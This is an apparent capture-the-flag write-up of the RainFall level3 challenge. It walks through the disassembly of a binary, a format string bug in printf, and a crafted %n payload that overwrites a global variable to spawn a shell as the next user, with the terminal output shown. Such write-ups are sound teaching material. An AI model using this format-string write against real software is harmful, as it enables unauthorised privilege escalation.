# This is the disassembly of the vulnerable function :

(gdb) disas v
Dump of assembler code for function v:
	0x080484a4 <+0>:	push   %ebp
	0x080484a5 <+1>:	mov    %esp,%ebp
	0x080484a7 <+3>:	sub    $0x218,%esp
	0x080484ad <+9>:	mov    0x8049860,%eax
	0x080484b2 <+14>:	mov    %eax,0x8(%esp)
	0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
	0x080484be <+26>:	lea    -0x208(%ebp),%eax
	0x080484c4 <+32>:	mov    %eax,(%esp)
	0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
	0x080484cc <+40>:	lea    -0x208(%ebp),%eax
	0x080484d2 <+46>:	mov    %eax,(%esp)
	0x080484d5 <+49>:	call   0x8048390 <printf@plt>
	0x080484da <+54>:	mov    0x804988c,%eax <== address of global var
	0x080484df <+59>:	cmp    $0x40,%eax
	0x080484e2 <+62>:	jne    0x8048518 <v+116> <== if (var == 0x40)
	0x080484e4 <+64>:	mov    0x8049880,%eax
	0x080484e9 <+69>:	mov    %eax,%edx
	0x080484eb <+71>:	mov    $0x8048600,%eax
	0x080484f0 <+76>:	mov    %edx,0xc(%esp)
	0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
	0x080484fc <+88>:	movl   $0x1,0x4(%esp)
	0x08048504 <+96>:	mov    %eax,(%esp)
	0x08048507 <+99>:	call   0x80483b0 <fwrite@plt> <==

	fwrite("Wait what!?\n", 1, 12, stdout);

	0x0804850c <+104>:	movl   $0x804860d,(%esp)
	0x08048513 <+111>:	call   0x80483c0 <system@plt>

	system("/bin/sh");

	0x08048518 <+116>:	leave
	0x08048519 <+117>:	ret
End of assembler dump.

# This program is not vulnerable to buffer overflows, because there is a length
# pushed onto the stack before the call to fgets().
# We can see that a check is performed against the variable at the address
# 0x804988c. If it is equal 0x40, the program writes 'Wait, what !' on stdout
# then spawns a shell.
# We can also see that the buffer is passed as the sole argument to printf.
# This indicates a format string exploit.
# We can abuse the fact that the user controls the content of the format
# string of printf to write an arbitrary value somewhere in memory, thanks to 
# a few tricks.
#
# The exploit is as follows :
# - The format string, when evaluated by printf, needs to have a certain current
# output length in bytes before invoking the %n flag.
# This is for building the wanted value.
# One way of doing it is to use padding in a conversion, while deducting from
# the padding the amount of bytes already written in the format string.
# Here we will subtract the length of the address in bytes from the amount of
# bytes generated by our dummy conversion.
# 
# - When printf reaches the %n flag, the function should be looking for the
# target address on the stack. This address will be located at the beginning of
# the format string, for convenience. We will use a positional argument flag
# so that printf will look for the target of %n at a positive offset
# (in memory words) from the stack pointer.
#
# For example, this is the state of the stack before calling printf, with
# the malicious format string already loaded in the buffer :

(gdb) x/8wx $esp
0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4f0:	0x0804988c	0x78303625	0x6e243425	0xb7fe000a

# We can see that the first word contains the address of the buffer passed to 
# printf. Here we want to write 64 bytes at address 0x804988c.
# Knowing all this, we can craft the malicious format string :

[target]   [wanted value - sizeof(target)][offset of buffer from esp in words]
[m]        [0x40 - sizeof(m) = 0x3c = 60] [$esp + 4]
[0x804988c][%60x]                         [%4$n]

# See './Resources/payload.py' for the content of the script.
# Finally, the result is :

level3@RainFall:~$ python /tmp/payload.py > /tmp/payload 
level3@RainFall:~$ cat /tmp/payload - | ./level3
ï¿½                                                         200
Wait what?!
whoami
level4
